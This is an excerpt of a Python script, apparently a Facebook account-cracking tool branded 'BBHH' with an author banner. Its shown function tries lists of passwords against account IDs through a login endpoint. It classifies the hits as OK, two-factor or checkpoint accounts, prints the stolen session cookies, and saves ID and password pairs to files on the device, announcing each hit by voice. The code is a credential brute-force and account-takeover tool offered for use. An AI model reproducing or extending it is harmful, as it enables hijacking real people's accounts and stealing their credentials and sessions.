...
############------[ LOGO ]------#########
os.system('espeak -a 300 "well,come to, BBHH , tools"')
def logo():
...
{40*"="} \x1b[1;97m
 [{R}+{W}] TOOLS TYPE : OLD AND RANDOM
 [{R}+{W}] AUTHOR   : MOHAMMAD ABDULLAH 
 [{R}+{W}] GITHUB    :  https://github.com/SHIHAB-CHOWDHURY6/
 [{R}+{W}] FACEBOOK : MOHAMMAD ABDULLAH 
              JUST WAIT F**K TIME 
 [{R}+{W}] VERSION  : {G}{version}{W}
{40*"="}\x1b[1;97m""")
############------[ RANDOM NUM ]------#########
def Main():
	logo()
...
def graphrm(id,psd,tid):
	...
	for psw in psd:
		...
		if 'session_key' in lo:
			...
			print(f'\r\r{G}[BBHH-OK] {iid} | {psw}{W}');os.system('espeak -a 300 "ok id"');ok.append(id);open('/sdcard/TKM-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'  ------------>>>'+coki+"\n")
			if 'y' in cokix:print(f'\r\r{R}[{G}COOKIES🍪{R}]{W} : {G}{coki}{E}');print(f"{W}{40*'-'}{E}")
			break
		elif twfx in str(lo):
			iid = lo['error']['error_data']['uid']
			print(f'\r\r{BL}[BBHH-2F] {iid} | {psw}{W}');os.system('espeak -a 300 "two,f id"');open('/sdcard/TKM-2F.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			twf.append(id)
			break
			...
			if iid in ok:pass
				...
				if 'y' in cpx:
					print(f'\r\r{R}[BBHH-CP] {iid} | {psw}{W}');cp.append(id);os.system('espeak -a 300 "cp id"');open('/sdcard/TKM-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			break
		else:continue
	lop+=1
Main()